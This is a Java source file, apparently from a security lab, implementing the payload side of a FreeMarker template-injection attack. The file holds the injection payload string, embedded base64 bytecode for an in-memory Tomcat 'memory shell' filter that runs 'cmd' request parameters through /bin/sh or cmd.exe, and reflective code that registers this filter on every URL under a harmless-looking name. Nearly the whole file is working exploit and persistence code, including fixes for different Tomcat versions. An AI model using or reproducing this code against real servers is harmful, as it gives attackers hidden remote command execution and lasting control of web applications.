package com.lab.themepreview.memshell;

import freemarker.template.SimpleScalar;
import freemarker.template.TemplateMethodModelEx;
import freemarker.template.TemplateModelException;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.List;

/**
 * ============================================================================
 *  ★ 这是「payload 侧」的类，不是业务代码。
 * ============================================================================
 *
 * 它存在的唯一目的：让 FreeMarker 的那一行 payload 尽量短、自包含、可复现：
 *
 *   ${"com.lab.themepreview.memshell.InjectHelper"?new(servletContext)()}
 *
 * 它做了三件事：
 *   1. 把 {@link #MEMSHELL_CLASS_B64}（内嵌的 MemshellFilter 字节码）用
 *      ClassLoader#defineClass 动态加载成类 —— 这个类不在应用的 jar 里，
 *      只存在于 JVM 内存中（进程重启即消失，这正是「内存马」）。
 *   2. 反射拿到 Spring 应用正在使用的 Tomcat StandardContext：
 *      ServletContext 的实现是 org.apache.catalina.core.ApplicationContextFacade，
 *      它的私有字段 context 就是 ApplicationContext，再取 .context 即 StandardContext。
 *   3. addFilterDef + addFilterMap + filterStart，把 /memshell 注册进运行中的容器。
 *
 * 实现了 FreeMarker 的 {@link TemplateMethodModelEx}（核心接口，2.x 全版本都还在，
 * 不像 freemarker.template.ObjectConstructor 在 2.3.29 被删掉）。
 *
 * ★ 为什么必须实现它：FreeMarker 的 ?new 内建**只允许构造实现了
 *   {@code freemarker.template.TemplateModel} 的类**（实测：
 *   ${"java.lang.Runtime"?new()} 会直接抛
 *   "Class java.lang.Runtime does not implement freemarker.template.TemplateModel"）。
 *   实现 TemplateMethodModelEx 之后，?new(servletContext) 会调构造器
 *   （注入在构造器里发生），构造出来的对象紧接着被 () 调用
 *   （exec 返回注入结果），于是注入结果直接回显在模板响应里。
 *
 * 它没有被任何 Controller 引用 —— 只能通过 SSTI 到达。
 */
public class InjectHelper implements TemplateMethodModelEx {

    /** MemshellFilter 的字节码（base64），由 ../build-memshell.ps1 生成后填进来。 */
    public static final String MEMSHELL_CLASS_B64 = "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PVJ1bnRpbWUMAGABBgEABE5hbWUHAS8MATABMQEABG4vYSgMATIAegEAASkBAAEmAQAFJmFtcDsMATMBNAEAATwBAAQmbHQ7AQABPgEABCZndDsBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YXgvc2VydmxldC9GaWx0ZXIBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQANamF2YS91dGlsL01hcAEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JbnB1dFN0cmVhbQEAAltCAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBAAZsZW5ndGgBAAMoKUkBABBqYXZhL3V0aWwvQmFzZTY0AQAKZ2V0RGVjb2RlcgEAB0RlY29kZXIBAAxJbm5lckNsYXNzZXMBABwoKUxqYXZhL3V0aWwvQmFzZTY0JERlY29kZXI7AQAEdHJpbQEAGGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcgEABmRlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBABhqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQBAAdmb3JOYW1lAQAuKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9uaW8vY2hhcnNldC9DaGFyc2V0OwEAHyhbQkxqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7KVYBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEALShMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBAA5zZXRDb250ZW50VHlwZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXdyaXRlAQAFZmx1c2gBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQALZW52aXJvbm1lbnQBABEoKUxqYXZhL3V0aWwvTWFwOwEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQATcmVkaXJlY3RFcnJvclN0cmVhbQEAHShaKUxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBAA9nZXRPdXRwdXRTdHJlYW0BABgoKUxqYXZhL2lvL091dHB1dFN0cmVhbTsBABRqYXZhL2lvL091dHB1dFN0cmVhbQEABWNsb3NlAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEABHJlYWQBAAUoW0IpSQEAByhbQklJKVYBAAd3YWl0Rm9yAQALdG9CeXRlQXJyYXkBAAQoKVtCAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAPamF2YS9sYW5nL0NsYXNzAQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAmamF2YS9sYW5nL21hbmFnZW1lbnQvTWFuYWdlbWVudEZhY3RvcnkBABZnZXRQbGF0Zm9ybU1CZWFuU2VydmVyAQAgKClMamF2YXgvbWFuYWdlbWVudC9NQmVhblNlcnZlcjsBABxqYXZheC9tYW5hZ2VtZW50L01CZWFuU2VydmVyAQAMZ2V0QXR0cmlidXRlAQBDKExqYXZheC9tYW5hZ2VtZW50L09iamVjdE5hbWU7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWdldFNpbXBsZU5hbWUBAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsAIQACAFoAAQBbAAIAGgBcAF0AAQBeAAAAAgANABoAXwBdAAEAXgAAAAIAAwAIAAEAYABhAAEAYgAAAB0AAQABAAAABSq3AAGxAAAAAQBjAAAABgABAAAAJwABAGQAZQABAGIAAAAZAAAAAgAAAAGxAAAAAQBjAAAABgABAAAALgABAGYAZwACAGIAAAGEAAQABwAAAN8BOgQrEgO5AAQCADoFGQXGACcZBbYABZ4AH7sABlm4AAcZBbYACLYACRIKuAALtwAMOgSnAA0rEg25AAQCADoEpwAFOgUZBMYACxkEtgAFmgAMLSssuQAPAwCxKhkEtwAQOgWnABs6BrsAEVm3ABISE7YAFBkGtgAVtgAWOgUsEhe5ABgCALsAEVm3ABI6BhkGEhm2ABQSGrYAFBIbtgAUGQS4ABy2ABQSHbYAFBkFuAActgAUEh62ABQqtwAftgAUEiC2ABRXLLkAIQEAGQa2ABa2ACIsuQAhAQC2ACOxAAIAAwBAAEMADgBbAGMAZgAOAAIAYwAAAF4AFwAAADMAAwA1AA0ANgAaADcANgA5AEAAPABDADsARQA/AFIAQABaAEEAWwBGAGMASQBmAEcAaABIAH4ASwCGAEwAjwBNAJgATgCdAE8ArwBQAMcAUQDVAFIA3gBTAGgAAAAfAAj9ADYHAGkHAGn6AAlCBwBqAQwISgcAavwAFwcAaQBrAAAABgACAGwAbQABAG4AYQABAGIAAAAZAAAAAQAAAAGxAAAAAQBjAAAABgABAAAAVwACAG8AcAACAGIAAAFQAAYACQAAAMYSJBIluAAmtgAnEii2ACmZACC7ACpZBr0ABlkDEitTWQQSLFNZBStTtwAtTacAHbsAKlkGvQAGWQMSLlNZBBIvU1kFK1O3AC1NLLYAME4tEjESMrkAMwMAVy0SNBI1uQAzAwBXLAS2ADZXLLYANzoEGQS2ADi2ADm7ADpZtwA7OgUZBLYAPDoGERAAvAg6BxkGGQe2AD1ZNgieABAZBRkHAxUItgA+p//pGQa2AD8ZBLYAQFe7AAZZGQW2AEESCrgAC7cADLAAAAACAGMAAABGABEAAABeABIAXwAvAGEASQBjAE4AZABZAGUAZABmAGoAaABwAGkAeABqAIEAawCIAGwAjwBuAJwAbwCpAHEArgByALQAcwBoAAAALAAEL/wAGQcAcf8ARQAIBwByBwBpBwBxBwBzBwB0BwB1BwB2BwB3AAD8ABkBAGsAAAAEAAEAeAACAHkAegABAGIAAABXAAIAAQAAADO7ABFZtwASEkK2ABQSQ7gARLYAFBJFtgAUKrYARrYAR7YAFRJItgAUKrcASbYAFLYAFrAAAAABAGMAAAASAAQAAAB3ABoAeAApAHkAMgB3AAIAewB6AAEAYgAAAIAAAwAEAAAAQLgASky7AEtZEky3AE1NKyzAAEsSTrkATwMAwAAGTi2wTLsAEVm3ABISULYAFCu2AEa2AFG2ABQSUrYAFLYAFrAAAQAAAB8AIAAOAAIAYwAAABoABgAAAIIABACDAA4AhAAeAIUAIACGACEAhwBoAAAABgABYAcAagAKAHwAcAABAGIAAABHAAMAAQAAAB4qxwAGEiWwKhJTElS2AFUSVhJXtgBVElgSWbYAVbAAAAACAGMAAAAOAAMAAACMAAQAjQAHAI8AaAAAAAMAAQcAAgB9AAAAAgB+APQAAAAKAAEAiQCGAPMACQ==";

    public static final String MEMSHELL_CLASS_NAME = "com.lab.themepreview.memshell.plugin.MemshellFilter";
    public static final String URL_PATTERN = "/*";
    public static final String FILTER_NAME = "themeHubSessionFilter";

    private final String status;

    /** FreeMarker 的 ?new(servletContext) 走这里。 */
    public InjectHelper(Object servletContext) {
        String s;
        try {
            s = install(servletContext);
        } catch (Throwable t) {
            s = "FAIL " + t;
            t.printStackTrace();
        }
        this.status = s;
    }

    /** payload 结尾的 () 走这里：把注入结果回显到模板响应。 */
    @Override
    public Object exec(List arguments) throws TemplateModelException {
        return new SimpleScalar(status);
    }

    // ========================================================================
    // 注入实现
    // ========================================================================
    public static String install(Object servletContext) throws Exception {
        Object standardContext = contextFrom(servletContext);
        if (standardContext == null) {
            return "FAIL cannot-resolve-StandardContext from " + servletContext;
        }

        byte[] bytes = java.util.Base64.getDecoder().decode(MEMSHELL_CLASS_B64.replaceAll("\\s", ""));
        Class<?> memshell = defineClass(bytes, MEMSHELL_CLASS_NAME);

        Object filter = memshell.getDeclaredConstructor().newInstance();
        invoke(filter, "init", new Class<?>[]{javax.servlet.FilterConfig.class}, new Object[]{null});

        // --- FilterDef ---
        // 坑：Tomcat 7 是 org.apache.catalina.deploy.FilterDef，
        //     Tomcat 8+ 挪到了 org.apache.tomcat.util.descriptor.web.FilterDef。
        Class<?> filterDefClass = loadFirst(
                "org.apache.tomcat.util.descriptor.web.FilterDef",
                "org.apache.catalina.deploy.FilterDef");
        Object filterDef = filterDefClass.getDeclaredConstructor().newInstance();
        callSetter(filterDef, "setFilterName", FILTER_NAME);
        callSetter(filterDef, "setFilter", filter);
        callSetter(filterDef, "setFilterClass", MEMSHELL_CLASS_NAME);
        callSetterIfPresent(filterDef, "setAsyncSupported", boolean.class, Boolean.TRUE);
        invoke(standardContext, "addFilterDef", new Class<?>[]{filterDefClass}, new Object[]{filterDef});

        // --- FilterMap: 映射到 /* ---
        Class<?> filterMapClass = loadFirst(
                "org.apache.tomcat.util.descriptor.web.FilterMap",
                "org.apache.catalina.deploy.FilterMap");
        Object filterMap = filterMapClass.getDeclaredConstructor().newInstance();
        callSetter(filterMap, "setFilterName", FILTER_NAME);
        if (!callSetterIfPresent(filterMap, "addURLPattern", String.class, URL_PATTERN)) {
            callSetterIfPresent(filterMap, "setURLPattern", String.class, URL_PATTERN);
        }
        boolean mapped = invoke(standardContext, "addFilterMap",
                new Class<?>[]{filterMapClass}, new Object[]{filterMap});
        if (!mapped) {
            Method m = standardContext.getClass().getMethod("addFilterMap", filterMapClass);
            m.setAccessible(true);
            Object r = m.invoke(standardContext, filterMap);
            mapped = !(r instanceof Boolean) || Boolean.TRUE.equals(r);
        }

        // --- 重建 filter chain：Tomcat 下次请求就会用上新 filter ---
        boolean started = false;
        try {
            started = invoke(standardContext, "filterStart", new Class<?>[0], new Object[0]);
        } catch (Throwable t) {
            System.err.println("[memshell] filterStart failed: " + t);
        }

        return "OK GET /memshell?cmd=id | filterMapped=" + mapped + " | filterStart=" + started
                + " | ctx=" + standardContext.getClass().getName()
                + " | filterLoader=" + memshell.getClassLoader();
    }

    /**
     * ServletContext(ApplicationContextFacade) -> ApplicationContext -> StandardContext
     *
     * 坑：Spring Boot 内嵌 Tomcat 的 StandardContext 实际是
     * org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext（StandardContext 的子类），
     * 所以<b>不能用 className.equals("org.apache.catalina.core.StandardContext")</b> 去判等，
     * 否则永远解析不到。必须用 isAssignableFrom / isInstance —— 这是本次实测踩到的坑。
     */
    private static Object contextFrom(Object servletContext) {
        if (servletContext == null) {
            return null;
        }
        Class<?> standardContextClass = standardContextClass();
        if (standardContextClass == null) {
            return null;
        }
        if (standardContextClass.isInstance(servletContext)) {
            return servletContext;
        }
        StringBuilder trace = new StringBuilder();
        Object o = servletContext;
        for (int i = 0; i < 4; i++) {
            trace.append('[').append(i).append(']').append(o.getClass().getName());
            Object next = readField(o, "context");
            if (next == null) {
                trace.append(" context=null");
                break;
            }
            trace.append(" context=").append(next.getClass().getName());
            o = next;
            if (standardContextClass.isInstance(o)) {
                System.out.println("[memshell] StandardContext resolved: " + trace
                        + " -> " + o.getClass().getName());
                return o;
            }
        }
        System.err.println("[memshell] cannot resolve StandardContext: " + trace);
        return null;
    }

    private static Class<?> standardContextClass() {
        try {
            return Class.forName("org.apache.catalina.core.StandardContext", false,
                    InjectHelper.class.getClassLoader());
        } catch (Throwable t) {
            return null;
        }
    }

    /** 按顺序尝试多个类名，返回第一个能加载到的（兼容 Tomcat 各版本的包名搬迁）。 */
    private static Class<?> loadFirst(String... classNames) throws ClassNotFoundException {
        for (String n : classNames) {
            try {
                return Class.forName(n, true, InjectHelper.class.getClassLoader());
            } catch (ClassNotFoundException ignored) {
            }
        }
        throw new ClassNotFoundException(classNames[0]);
    }

    private static Object readField(Object target, String name) {
        Class<?> c = target.getClass();
        while (c != null) {
            try {
                Field f = c.getDeclaredField(name);
                f.setAccessible(true);
                return f.get(target);
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            } catch (Throwable t) {
                return null;
            }
        }
        return null;
    }

    // ------------------------------------------------------------------------
    // 动态定义类：优先应用 ClassLoader，其次 Tomcat WebappClassLoader，最后自建
    // ------------------------------------------------------------------------
    private static Class<?> defineClass(byte[] bytes, String name) throws Exception {
        ClassLoader appLoader = InjectHelper.class.getClassLoader();
        ClassLoader webappLoader = webappClassLoader();
        ClassLoader tccl = Thread.currentThread().getContextClassLoader();

        ClassLoader[] chain = new ClassLoader[]{appLoader, webappLoader, tccl};
        StringBuilder tried = new StringBuilder();
        for (ClassLoader cl : chain) {
            if (cl == null) {
                continue;
            }
            String cn = cl.getClass().getName();
            if (tried.indexOf(cn) >= 0) {
                continue;
            }
            tried.append(cn).append(' ');
            Class<?> c = tryDefine(cl, bytes, name);
            if (c != null) {
                return c;
            }
        }
        ClassLoader cl = new java.net.URLClassLoader(new java.net.URL[0], appLoader);
        Class<?> c = tryDefine(cl, bytes, name);
        if (c != null) {
            return c;
        }
        throw new ClassNotFoundException("cannot define " + name + " via [" + tried.toString().trim() + "]");
    }

    /** 从 TCCL 往上找 Tomcat 的 WebappClassLoaderBase（它才知道自己的 StandardContext）。 */
    private static ClassLoader webappClassLoader() {
        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        while (cl != null) {
            String n = cl.getClass().getName();
            if (n.equals("org.apache.catalina.loader.WebappClassLoaderBase")
                    || n.equals("org.apache.catalina.loader.WebappClassLoader")
                    || n.equals("org.apache.catalina.loader.ParallelWebappClassLoader")) {
                return cl;
            }
            cl = cl.getParent();
        }
        return null;
    }

    private static Class<?> tryDefine(ClassLoader cl, byte[] bytes, String name) {
        // 1) 反射调用 protected ClassLoader#defineClass
        try {
            Method m = ClassLoader.class.getDeclaredMethod("defineClass",
                    String.class, byte[].class, int.class, int.class);
            m.setAccessible(true);
            Object r = m.invoke(cl, name, bytes, 0, bytes.length);
            if (r instanceof Class) {
                return (Class<?>) r;
            }
        } catch (Throwable ignored) {
        }
        // 2) 匿名子类里调 defineClass（FlushableClassLoader 经典写法）
        try {
            return new FlushableClassLoader(cl, bytes).loadClass(name);
        } catch (Throwable ignored) {
        }
        return null;
    }

    /** 父加载器委派 + 拦截目标包名，经典内存马 defineClass 姿势。 */
    public static class FlushableClassLoader extends ClassLoader {
        private final byte[] bytes;

        public FlushableClassLoader(ClassLoader parent, byte[] bytes) {
            super(parent);
            this.bytes = bytes;
        }

        @Override
        public Class<?> loadClass(String name) throws ClassNotFoundException {
            return loadClass(name, false);
        }

        @Override
        protected Class<?> loadClass(String name, boolean resolve) throws ClassNotFoundException {
            if (name.startsWith("com.lab.themepreview.memshell.plugin.")) {
                Class<?> c = findLoadedClass(name);
                if (c == null) {
                    c = defineClass(name, bytes, 0, bytes.length);
                }
                if (resolve) {
                    resolveClass(c);
                }
                return c;
            }
            return super.loadClass(name, resolve);
        }
    }

    // ------------------------------------------------------------------------
    // 反射小工具
    // ------------------------------------------------------------------------
    private static boolean invoke(Object target, String method, Class<?>[] types, Object[] args) {
        try {
            Method m = target.getClass().getMethod(method, types);
            m.setAccessible(true);
            Object r = m.invoke(target, args);
            return !(r instanceof Boolean) || Boolean.TRUE.equals(r);
        } catch (Throwable t) {
            System.err.println("[memshell] invoke " + method + " failed: " + t);
            return false;
        }
    }

    /**
     * 调用 setter。
     *
     * 坑：不能直接 getMethod(name, value.getClass()) —— 例如
     * FilterDef.setFilter(javax.servlet.Filter) 声明的形参是<b>接口</b>，
     * 而手里的实例是 MemshellFilter，精确匹配会抛 NoSuchMethodException。
     * 所以按「形参类型可从实参类型赋值」来挑重载。
     */
    private static void callSetter(Object target, String setter, Object value) throws Exception {
        Method m = findSetter(target.getClass(), setter, value == null ? null : value.getClass());
        if (m == null) {
            throw new NoSuchMethodException(target.getClass().getName() + "." + setter + "(" + value + ")");
        }
        m.setAccessible(true);
        m.invoke(target, value);
    }

    private static Method findSetter(Class<?> c, String setter, Class<?> argType) {
        for (Method m : c.getMethods()) {
            if (!m.getName().equals(setter) || m.getParameterTypes().length != 1) {
                continue;
            }
            Class<?> p = m.getParameterTypes()[0];
            if (argType == null || p.isAssignableFrom(argType) || (p.isPrimitive() && isBoxed(p, argType))) {
                return m;
            }
        }
        return null;
    }

    private static boolean isBoxed(Class<?> primitive, Class<?> boxed) {
        if (primitive == boolean.class) {
            return boxed == Boolean.class;
        }
        if (primitive == int.class) {
            return boxed == Integer.class;
        }
        return false;
    }

    private static boolean callSetterIfPresent(Object target, String setter, Class<?> type, Object value) {
        try {
            Method m = target.getClass().getMethod(setter, type);
            m.setAccessible(true);
            m.invoke(target, value);
            return true;
        } catch (Throwable t) {
            return false;
        }
    }
}
